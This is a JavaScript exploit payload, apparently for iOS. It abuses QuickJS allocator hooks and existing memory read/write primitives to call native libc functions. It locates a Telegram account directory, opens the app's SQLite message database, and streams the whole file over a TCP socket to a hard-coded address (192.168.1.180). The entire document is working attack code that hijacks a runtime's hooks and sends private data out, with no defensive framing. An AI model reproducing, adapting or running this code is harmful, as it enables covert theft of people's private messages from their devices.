/* ===== iOS 27 full DB exfil via QuickJS allocator hooks (no pivot) ===== */
  var MK = setres;
  function u64(x) { return BigInt.asUintN(64, x); }
  function rd32_(A) {
    var a = A & ~7n;
    var q = u64(RD(a));
    var sh = Number(A & 7n) * 8;
    return Number((q >> BigInt(sh)) & 0xffffffffn);
  }
  var base = 0n;
  if (CFG.JS_DEF_FREE) {
    base = u64(js_free - BigInt(CFG.JS_DEF_FREE));
    if ((rd32_(base) >>> 0) !== 0xfeedfacf) base = 0n;
  }
  if (base === 0n) { MK('H_NO_BASE'); return; }
  var libcFree = RD(js_free + 0x29ba084n);
  if (!codeok(libcFree)) { MK('H_NO_FREE'); return; }
  var OPEN = u64(libcFree + 0xb79b52bcn);
  var READ = u64(libcFree + 0xb79b4a44n);
  var WRITE = u64(libcFree + 0xb79b3b8cn);
  var SOCKET = u64(libcFree + 0xb79b3fb4n);
  var CONNECT = u64(libcFree + 0xb79b9998n);
  var CLOSE = u64(libcFree + 0xb79afe3cn);
  var OPENDIR = u64(libcFree + 0x79bc278n);
  var READDIR = u64(libcFree + 0x79bc3e4n);
  var USABLE0 = u64(base + 0x38f24n);

  var CHUNK = 4194304, CHUNK_B = 4194304n, RDBUF = 1048576;
  var RAB = new ArrayBuffer(4096, { maxByteLength: CHUNK });
  var UB = new Uint8Array(RAB);
  globalThis.__RABKEEP = [RAB, UB];
  for (var i0 = 0; i0 < 4096; i0++) UB[i0] = 0;
  var MAG = (BigInt((Math.random() * 0x100000000) >>> 0) << 32n) |
            BigInt((Math.random() * 0x100000000) >>> 0);
  if (MAG === 0n) MAG = 0x5a5a5a5a5a5a5a5an;
  for (var i1 = 0; i1 < 8; i1++) UB[0x800 + i1] = Number((MAG >> BigInt(8 * i1)) & 0xffn);
  var U = 0n, S = 0n, lim = 0x10000n, off;
  for (off = D; off < D + lim; off += 8n) {
    var w = RD(off);
    if ((w & 0xffffffffn) === 4096n) {
      var p = RD(off + 16n);
      var pq = p & 0x00ffffffffffffffn;
      if (pq > 0x10000n && pq < 0x0001000000000000n && (p & 7n) === 0n) {
        try { if (RD(p + 0x800n) === MAG) { U = p; S = off; break; } } catch (e) {}
      }
    }
  }
  if (U === 0n) {
    for (off = D - 8n; off > D - lim; off -= 8n) {
      var w2 = RD(off);
      if ((w2 & 0xffffffffn) === 4096n) {
        var p2 = RD(off + 16n);
        var pq2 = p2 & 0x00ffffffffffffffn;
        if (pq2 > 0x10000n && pq2 < 0x0001000000000000n && (p2 & 7n) === 0n) {
          try { if (RD(p2 + 0x800n) === MAG) { U = p2; S = off; break; } } catch (e) {}
        }
      }
    }
  }
  if (U === 0n) { MK('H_NF D=' + hex(D)); return; }

  var GRP = '/private/var/mobile/Containers/Shared/AppGroup/00000000-0000-0000-0000-000000000000/telegram-data';
  var oDir = 0, oPath = 0x200, oSock = 0x400, oRead = 0x1000;
  for (var i2 = 0; i2 < GRP.length; i2++) UB[oDir + i2] = GRP.charCodeAt(i2) & 0xff;
  UB[oDir + GRP.length] = 0;
  UB[oSock] = 16; UB[oSock + 1] = 2;
  UB[oSock + 2] = 0x11; UB[oSock + 3] = 0x66;
  UB[oSock + 4] = 192; UB[oSock + 5] = 168; UB[oSock + 6] = 1; UB[oSock + 7] = 180;

  RAB.resize(CHUNK);
  var U2 = RD(S + 16n);
  if (RD(U2 + 0x800n) !== MAG) { MK('H_BAD_U2'); return; }

  var S0 = S, S16 = S + 16n;
  var RT_REALLOC = rt + 24n, RT_USABLE = rt + 32n, RT_OPAQUE = rt + 64n;
  var REAL_REALLOC = RD(RT_REALLOC), REAL_USABLE = RD(RT_USABLE);

  function W8(A, V) { setR(A); Rb[0] = V; }
  function callHook(hook, x0, ptr, size) {
    W8(RT_REALLOC, hook);
    W8(RT_USABLE, USABLE0);
    W8(RT_OPAQUE, x0);
    W8(S16, ptr);
    W8(S0, CHUNK_B);
    try { RAB.resize(size); } catch (e) {}
    W8(RT_REALLOC, REAL_REALLOC);
    W8(RT_USABLE, REAL_USABLE);
    var ret = (RD(S0) === CHUNK_B) ? 0n : RD(S16);
    W8(S16, U2);
    W8(S0, CHUNK_B);
    return ret;
  }
  function wrStr(a, s) {
    for (var i = 0; i <= s.length; i += 8) {
      var v = 0n;
      for (var j = 0; j < 8 && i + j < s.length; j++) {
        v |= BigInt(s.charCodeAt(i + j)) << BigInt(8 * j);
      }
      W8(a + BigInt(i), v);
    }
  }

  var DIR = callHook(OPENDIR, U2 + BigInt(oDir), U2, 1);
  if (DIR < 0x10000n || DIR > 0x0001000000000000n) { MK('H_ODIR ' + hex(DIR)); return; }
  var acc = '';
  for (var r = 0; r < 64; r++) {
    var dp = callHook(READDIR, DIR, U2, 1);
    if (dp === 0n) break;
    if (dp > 0x0001000000000000n) { MK('H_RD ' + hex(dp)); return; }
    var ds = '';
    for (var i3 = 0; i3 < 64; i3 += 8) {
      var q = RD(dp + BigInt(i3));
      for (var j3 = 0; j3 < 8; j3++) {
        ds += String.fromCharCode(Number((q >> BigInt(8 * j3)) & 0xffn));
      }
    }
    var pa = ds.indexOf('account-');
    if (pa >= 0) {
      var pe = ds.indexOf('\0', pa);
      acc = ds.substring(pa, pe < 0 ? pa + 64 : pe);
      break;
    }
  }
  if (!acc) { MK('H_ACC'); return; }
  var dbp = GRP + '/' + acc + '/postbox/db/db_sqlite';
  wrStr(U2 + BigInt(oPath), dbp);

  var fdDb = callHook(OPEN, U2 + BigInt(oPath), 0x100n, 1);
  if (fdDb < 0n || fdDb > 0xffffn) { MK('H_OD ' + hex(fdDb) + ' A=' + acc); return; }
  var fdSock = callHook(SOCKET, 2n, 1n, 6);
  if (fdSock < 3n || fdSock > 0xffffn) { MK('H_SOCK ' + hex(fdSock)); return; }
  var cr = callHook(CONNECT, fdSock, U2 + BigInt(oSock), 16);
  if (cr < 0n) { MK('H_CONN ' + hex(cr)); return; }

  var total = 0n, chunks = 0, first = 1;
  for (;;) {
    var n = callHook(READ, fdDb, U2 + BigInt(oRead), RDBUF);
    if (n < 1n) break;
    if (first) {
      first = 0;
      if (n < 16n || RD(U2 + BigInt(oRead)) !== 0x66206574694c5153n ||
          RD(U2 + BigInt(oRead + 8)) !== 0x00332074616d726fn) {
        MK('H_NOTDB ' + acc);
        return;
      }
    }
    var done = 0n;
    while (done < n) {
      var w = callHook(WRITE, fdSock, U2 + BigInt(oRead) + done, Number(n - done));
      if (w < 1n) { MK('H_WR ' + hex(w) + ' T=' + total); return; }
      done += w;
    }
    total += n;
    chunks++;
  }
  MK('H_DONE ' + total + ' C=' + chunks);
  callHook(CLOSE, fdSock, 1n, 1);
  callHook(CLOSE, fdDb, 1n, 1);
